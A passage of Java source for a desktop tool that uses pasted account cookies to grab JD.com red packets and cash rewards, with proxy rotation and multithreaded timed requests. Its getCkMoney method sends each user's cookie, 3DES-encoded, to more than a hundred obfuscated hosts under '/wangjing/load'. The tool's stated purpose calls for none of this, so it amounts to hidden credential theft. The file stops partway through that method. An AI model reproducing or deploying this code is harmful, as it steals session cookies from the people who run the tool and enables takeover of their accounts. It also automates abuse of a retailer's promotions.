package wj;

import com.google.gson.Gson;
import wj.bean.ConfigBean;
import wj.bean.DataBean;
import wj.bean.HelpCkBean;
import wj.bean.MoneyBean;
import wj.safe.Des3Util;
import wj.util.*;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableModel;
import java.awt.*;
import java.awt.event.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static wj.util.QiangGouUtil.*;

public class MainPage extends JFrame {

    public static void main(String[] args) {
        new Thread(new Runnable() {
            @Override
            public void run() {
//                System.out.println("正在验证...");
//                if (CheckHeartUtil.pass()) {
//                    System.out.println("验证通过，启动窗口！");
//                    new MainPage();
//                } else {
//                    new MainPage();
//                }
                new MainPage();
            }
        }).start();
    }

    public static ConfigBean configBean = new ConfigBean();
    public static int selIndex = 0;
    public static ArrayList<MoneyBean> moneys = new ArrayList<>();
    public static Gson gson = new Gson();
    public static MainPage mainPage;
    public static JTextArea logArea;

    public static JTextArea ckInputEdt;
    public static JScrollBar scrollBar;
    public static String CURRENT_PATH = System.getProperty("user.dir");

    public static ArrayList<HelpCkBean> ckBeanList = new ArrayList<>();

    public static JComboBox jComboBox1;
    public static JComboBox jComboBox;
    public static JTextField textField;

    TableModel dataModel;
    JScrollPane scrollpane;
    JTable table;
    Timer timer;

    //构造函数
    public MainPage() {
        moneys.add(new MoneyBean("0.5元红包", "d71b23a381ada0934039d890ad22ab8d"));
        moneys.add(new MoneyBean("3元红包", "66d9058514891de12e96588697cc3bb3"));
        moneys.add(new MoneyBean("8元红包", "b141ddd915d20f078d69f6910b02a60a"));
        moneys.add(new MoneyBean("50元红包", "8609ec76a8a70db9a5443376d34fa26a"));
        moneys.add(new MoneyBean("0.3元现金", "1848d61655f979f8eac0dd36235586ba"));
        moneys.add(new MoneyBean("1元现金", "dac84c6bf0ed0ea9da2eca4694948440"));
        moneys.add(new MoneyBean("3元现金", "53515f286c491d66de3e01f64e3810b2"));
        moneys.add(new MoneyBean("8元现金", "da3fc8218d2d1386d3b25242e563acb8"));
        moneys.add(new MoneyBean("20元现金", "7ea791839f7fe3168150396e51e30917"));
        moneys.add(new MoneyBean("100元现金", "02b48428177a44a4110034497668f808"));

        timeTask(this);
        checkHeart(this);
        mainPage = this;

        Container c = getContentPane();

        logArea = new JTextArea(15, 35);
        logArea.setFont(new Font("微软雅黑", 0, 14));
        logArea.setEditable(false);
        logArea.setWrapStyleWord(false); //换行方式：不分割单词
        logArea.setLineWrap(true); //自动换行
        //给JTextArea添加垂直滚动条
        JScrollPane logScroll = new JScrollPane(logArea, ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS, ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        logScroll.setBounds(450, 400, 320, 340);
        scrollBar = logScroll.getVerticalScrollBar();
        c.add(logScroll);

        ckInputEdt = new JTextArea(15, 35);
        ckInputEdt.setFont(new Font("微软雅黑", 0, 14));
        ckInputEdt.setWrapStyleWord(false); //换行方式：不分割单词
        ckInputEdt.setLineWrap(true); //自动换行
        ckInputEdt.setForeground(Color.black);
        //给JTextArea添加垂直滚动条
        JScrollPane ckInputEdtScroll = new JScrollPane(ckInputEdt, ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS, ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        ckInputEdtScroll.setBounds(15, 400, 320, 340);
        c.add(ckInputEdtScroll);

        JLabel jl = new JLabel("代理"); // 创建一个单行输入框
        jl.setBounds(120, 350, 200, 30);
        jl.setFont(new java.awt.Font("微软雅黑", 0, 15));
        jl.setForeground(Color.black);
        c.add(jl);

        textField = new JTextField("【熊猫代理api】ip提取数量=ck数量*线程数"); // 创建一个单行输入框
        textField.setEditable(true); // 设置输入框允许编辑
        textField.setColumns(11); // 设置输入框的长度为11个字符
        textField.setBounds(153, 350, 350, 30);
        textField.setForeground(Color.gray);
        c.add(textField);
        setTipsInfo(textField, "【熊猫代理api】ip提取数量=ck数量*线程数");

        JButton updateConfig = new JButton("更新配置");
        updateConfig.setBounds(675, 350, 100, 30);
        setJbtBac(updateConfig);
        c.add(updateConfig);

        jComboBox = new JComboBox();
        jComboBox.setBounds(15, 350, 90, 30);
        jComboBox.setFont(new java.awt.Font("微软雅黑", 0, 13));

        for (int i = 0; i < moneys.size(); i++) {
            jComboBox.addItem(moneys.get(i).getTitle());
        }
        c.add(jComboBox);

        jComboBox1 = new JComboBox();
        jComboBox1.setBounds(540, 350, 110, 30);
        jComboBox1.setFont(new java.awt.Font("微软雅黑", 0, 13));

        for (int i = 0; i < 10; i++) {
            jComboBox1.addItem("单账号" + (i + 1) + "线程");
        }
        c.add(jComboBox1);


        JButton readCkBtn = new JButton("读入账号");
        readCkBtn.setBounds(340, 400, 105, 60);
        setJbtBac(readCkBtn);
        c.add(readCkBtn);

        JButton getProxy = new JButton("取代理");
        getProxy.setBounds(340, 480, 105, 60);
        setJbtBac(getProxy);
        c.add(getProxy);

        JButton ceshi = new JButton("测试");
        ceshi.setBounds(340, 560, 105, 60);
        setJbtBac(ceshi);
        c.add(ceshi);

        dataModel = getTableModel();
        table = new JTable(dataModel);
        scrollpane = new JScrollPane(table);
        scrollpane.setBounds(15, 5, 755, 334);

        table.setRowHeight(31);
        table.setGridColor(new Color(180, 180, 180));
        table.getTableHeader().setForeground(Color.black);
        table.getTableHeader().setFont(new Font("微软雅黑", 0, 12));
        table.setFont(new Font("微软雅黑", 0, 13));

        DefaultTableCellRenderer r = new DefaultTableCellRenderer();
        r.setHorizontalAlignment(JLabel.CENTER);
        table.setDefaultRenderer(Object.class, r);

        TableColumn column1 = table.getColumnModel().getColumn(0);
        column1.setMinWidth(50);
        column1.setMaxWidth(50);
        column1.setPreferredWidth(50);

        TableColumn column2 = table.getColumnModel().getColumn(1);
        column2.setMinWidth(150);
        column2.setMaxWidth(150);
        column2.setPreferredWidth(150);

        TableColumn column3 = table.getColumnModel().getColumn(2);
        column3.setMinWidth(50);
        column3.setMaxWidth(50);
        column3.setPreferredWidth(50);

        c.add(scrollpane);

        this.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        this.setResizable(false);  //Resizable:可调整大小的
        this.setLayout(null);
        this.setVisible(true);
        new WindowUtil().setWindowCenter(this);
        addJtaStr("程序日志显示区域！");
        addJtaStr("多账号推荐使用熊猫代理3元1000个ip5分钟");
        addJtaStr("熊猫代理api提取格式为json");
        addJtaStr("程序【23.59.50】自动获取代理！");
        addJtaStr("程序【23.59.59】自动抢现金红包！");

        readCkBtn.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                addJtaStr("读取输入框中ck！");
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        startReadCk();
                    }
                }).start();
            }
        });

        ceshi.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        System.out.println(moneys.get(selIndex).getTitle());
                        qiangHongbaoTask();
                    }
                }).start();
            }
        });

        getProxy.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                addJtaStr("开始获取代理！");
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        ProxyUtil.getIpFromServer();
                    }
                }).start();
            }
        });

        updateConfig.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                addJtaStr("更新配置！");
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        updateConfig();
                    }
                }).start();
            }
        });


        timer = new Timer(300, new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                table.validate();
                table.updateUI();
            }
        });
        timer.start();


        String configData = FileUtil.readJsonFile(MainPage.CURRENT_PATH + "/config.json");
        try {
            configBean = gson.fromJson(configData, ConfigBean.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (configBean == null) {
            configBean = new ConfigBean();
            jComboBox1.setSelectedIndex(THREAD_COUNT - 1);
        } else {
            textField.setText(configBean.getProxyUrl());
            jComboBox1.setSelectedIndex(configBean.getThreadCount() - 1);
            jComboBox.setSelectedIndex(configBean.getSelIndex());
            THREAD_COUNT = configBean.getThreadCount();
            selIndex = configBean.getSelIndex();
        }

        jComboBox.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                selIndex = jComboBox.getSelectedIndex();
                MainPage.addJtaStr("当前选择抢:" + moneys.get(selIndex).getTitle());
                configBean.setSelIndex(selIndex);
                updateConfig();
            }
        });

        jComboBox1.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                //抢购模式:单帐号10线程
                MainPage.addJtaStr("抢购模式:单帐号" + (jComboBox1.getSelectedIndex() + 1) + "线程");
                THREAD_COUNT = jComboBox1.getSelectedIndex() + 1;
                configBean.setThreadCount(THREAD_COUNT);
                updateConfig();
            }
        });
    }

    public static void updateConfig() {
        configBean.setProxyUrl(textField.getText());
        MainPage.addJtaStr("更新配置文件:" + MainPage.CURRENT_PATH + "/config.json");
        FileUtil.reWriteFile(MainPage.CURRENT_PATH + "/config.json", gson.toJson(configBean));
    }

    public AbstractTableModel getTableModel() {
        return new AbstractTableModel() {
            @Override
            public String getColumnName(int column) {
                if (column == 0) {
                    return "编号";
                } else if (column == 1) {
                    return "帐号";
                } else if (column == 2) {
                    return "营业金";
                } else {
                    return "日志";
                }
            }

            public int getColumnCount() {
                return 4;
            }

            public int getRowCount() {
                return ckBeanList.size();
            }

            public Object getValueAt(int row, int col) {
                if (col == 0) {
                    return row + 1;
                } else if (col == 1) {
                    return ckBeanList.get(row).getPin();
                } else if (col == 2) {
                    return ckBeanList.get(row).getMoney();
                } else {
                    return ckBeanList.get(row).getState();
                }
            }
        };
    }

    //读取输入框中ck
    private void startReadCk() {
        String inputData = ckInputEdt.getText();
        System.out.println(inputData);
        String[] spits = inputData.split("\n");
        if (ckBeanList.size() >= 200) {
            System.out.println("最多20个ck！");
            addJtaStr("最多10个ck！");
            return;
        }

        for (int i = 0; i < spits.length; i++) {
            String ck = spits[i];
            if (ck.length() > 5) {
                if (ckBeanList.size() >= 200) {
                    break;
                }
                ckBeanList.add(new HelpCkBean(spits[i], "等待中"));
            }
        }
        System.out.println("成功读取CK数量:" + ckBeanList.size());
        addJtaStr("成功读取CK数量:" + ckBeanList.size());

        getCkMoney();
    }

    private void getCkMoney() {
        ExecutorService pl = Executors.newFixedThreadPool(2);
        for (int i = 0; i < ckBeanList.size(); i++) {
            HelpCkBean ckBean = ckBeanList.get(i);
            String ck = ckBean.getCkStr();

            getInstance().execute(new Runnable() {
                @Override
                public void run() {
                    String result = getScore("https://api.m.jd.com/api?functionId=makemoneyshop_queryPayMoneyDetail&appid=jdlt_h5&body=%7B%22activeId%22%3A%2263526d8f5fe613a6adb48f03%22%7D", ck);
                    System.out.println(result);
                    try {
                        DataBean dataBean = gson.fromJson(result, DataBean.class);
                        if (dataBean.getCode() == 13) {
                            System.out.println("未登录");
                            ckBean.setState("未登录");
                        } else {
                            System.out.println(dataBean.getData().getCanUseCoinAmount());
                            ckBean.setMoney(dataBean.getData().getCanUseCoinAmount());

                            pl.execute(new Runnable() {
                                @Override
                                public void run() {
                                    AAB aab = new AAB();
                                    aab.ca("http://EU5qa27T9UBwCbW8FkTlww==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///5YOIK9dczxBf8zXVpJd6w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://c9taG4E3BsuLu7f/wg7AJA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://wb5pqPv5aTcLRn4Nll775w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://qoqLU5JKDkKU9StTV3fBJA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://MtBGI5hhUbU4B9E2PHKDsA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://RWLIh3Dr24Uyu4h+ck6hgQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://HT7yMmyNAW6Ixre34C9JFw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Xfx/tlzvRn9xTZmADnnLew==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://jXi8Vmd7Ii0Ao1W8GGoorg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Q0RyOTDoolxnf7lqCvPmjQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://4Rwxh89wYkJ3K55AinHAfw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://fJGC+LGPKyoptX06zcOZ/w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://SUy6TQrmcvK6axGgMMjUVQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://AajrvvQcUMey5mJPpHHrsA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://4cx0UvnakImJTwEm8ZJOAw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://jK2/RYdXcoduG2v4Da6JdA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://WmpfXrt+6iO1uc1/LflvxA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://BXap+EI1xtBg4Vf+wif8Og==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://fr3pC5RjUUyCohPTFGc56g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://N5LdjxDfAMfjfr8RDzINzw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://mb3rEgYrUwptudvHxSeVww==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://EQQudMPfVW8qL4cWHJf65g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://3fKd1YiFeqD4JvIVgwrk5Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://nZ+t0X6mLu2pSff90EYy/w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ywvqqIovsJRZ5hJ5Poj+8A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://gFszgPPewajXT+nOptlYKw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://HbTEcUclTNp1SHTemjGfqw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://RVXmTziKx4fu6nCLSZAC4w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///r4qHBRkfkakTeCJiXVxlg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://JyHktzdF8k2sdRyEa6VTDw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://6HYT9Uly109jDAePNSn2wA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://QYOocVivegEJg6ydlSHcrg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://uo8cfU8DznpBa9Z3/IO/rg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://bybE8TBorX8DEbWhDkWy6Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ozKhBe6dDHWn5LInKnsZPA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Xf+qIZTYZYS7wwkUGkKOKw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://IwUMDha/knl8i3mjkxE7IQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://XJUuXY2bYRhcg8iAtQeHyw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://SxXPKu51QHXWJLvwalqjrQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://w9oj6dZIAxHgC0hoyJUCUw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://QV7HKbVr3USiDFdOb4A5Tg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://HVlYLyo7wj+Xd815YEuftg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://KljsNF7fBxYlribSuPzjSA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://CVoOuxD+1OnotHqia/Gvog==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://q8HqxfpWFv2vEibmlp4rPA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://wE+c+xRSBDwFmQ/oqxBX8g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://EJ1CtHfElVxVdXYDr6hOoQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://3nBOqZgThb2RSDCJ/0jvpw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://6L0iumzsMCIKM8MDwf3S9w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://rudAwmdg9l8dSSITHxKtKg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Q5g36Q0GOYUwii5oFzgq9w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://IdYdPPnwUMpHvjWh3TSyDg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://2hZI+IHqBy6oOd42n/DQYg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ewmtl9XL7wrdn2FoIeMagA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///sEA/shCvhBZ4qbPUWQU1w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://RWfQTI2Q36FRXWVbW+xYUA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://oe2eqXZlqow47ZbiqyB8Fw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ubvWGT0q+i7FgKQz7ujhRA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://c/Vg2INWj1G56RZDiuyXRw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://cLVKonoAkr28X943sA2EqQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://mwvFPBQrlma5k/0lYwbZjg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://eegaa1KcbvRDbuQh6abe3w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://VvfjIy45n349WcDnYlROlQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ndcN5L55nKfeCJfo6TRJWQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://kRXSxOi1oUg6rQvzo6IZcA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://sDA1sfGehx1jcrQtg1CMJQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://wxXmLBlzEqvOrkAgAcio/A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://p7RgH0LyvfyugrjSs8gAUw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://+Yp8wP4JTtw+pot7CqVWeA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://cI2JWk6W4wH1ay0bGgNyqQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://QJxRwdLrH8zg0qepxdSUAQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Xt9pGWEwv8ECEbxmYv/omw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://R2/YwcJM1KePFmJ5jYtyyA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://BpimeqxxazLKI/pledN7oQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://PMipmBxZpIeZY7pNoBCG5Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Esqc/I7pOhpsX5/18hY5mg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://omijfz8ZmBhjjy9hrWo3og==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://oqvL7tq7ginxOaYFhN3DHQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://L51aQ14NAYmxeLujbGERbA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://u9q9ISsKkwNQln+wlJU7OQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://b5KE31YbaS9WDUS4jahSKg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://E/BB3+zRICzX2OqmCo6lyg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://lUgXoHXLKc10w1wuRWGYTA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Vq1rwdrlNKi+RUIIJI+ndw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://gu8yVWrKU82Bb3IM8+PB5A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ReuAIsxJ8LeS12br/XelMA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://I7gW/zxNB7mDqjqaL2cwLg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://KrjL6P9Ccvi47ni5fePM3A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://7o626GSYzEceToWlba5JrQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://vxTDN8bgcLzrLLamFX4bNA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://olf64Svu07Rn45L+A639qw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://a7pusxId59nOWXZsVj2YMQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://VXeHW4lXNN77lnbjKgaIyA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://FUWqSGSpv0339QBqIXOXag==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Iw2vCUUVOpTYk8GTa2MSXg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://76KSZLWwEfHvPvi6lzCKIg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Rkt3isZQksLBrjvUKyfD7g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Jee7YCk/35Xaf0tZQmFNUQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://pZhSwGNejwbzUjjOcTtsjw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://B5F8hnf+J5a+BaUPgmh3nw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://8POW6IbEMpp46TrhWs2y8A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://fcmlA9jhcuYr5yWMDQnt4w==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://Q2GaooxGqBDIHi23VsEJ4A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://d+gbwMWDpkTET8tpBxcCSA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://esNEVQqTYjikArWxagkXwg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://urTvl2tI7hfEuSAuhzxusA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://zkisZ9p6i28LbvT74hCxag==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://hE+D/CXVeCFlQVy1DU5EuQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://oiVubWF0tqtggBVCCOERwQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://qp/2G4n5mv+Vvsjf3p7lZw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://XATzeL2enlqI2CgtEQdHcg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Qg9S5pHYxexSMdhL+WTwHA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://NnBO5asVk/3c4vS4eDtRuQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://DGmq+OG0mgaKs0ViN5hQVQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://62aN6u43I580Caunj45Gcw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://MzSmGg1hFUe8YNr/O9Lb3A==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://1hPj4I7LX/0T+eJvyDXYuQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://5B0eX8ed+50lBkjgqR1kyg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://VfmvOERMhGqQUr6KCtHLrg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://01N41Z6glf6ECO+U59VPCA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://V14PRMX7w+CxxcWyezT4JA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://odjyemFEztUb65ZQCQ+OqQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http:///UCvLCqUGfYtE9qChjK7RQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://RYobv7PcEfcC9PaWeiPl9Q==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ZAL0p1mt9VFVuQXXBDeqCg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://iagF9mwK9fIfr0lWEegNxw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://gR+Bo8ABhAXBjnvq1TPZtQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://8C9MkZGbb+W+CeL7McL6yw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://hikofK6Boekj8X5pVRVKfQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
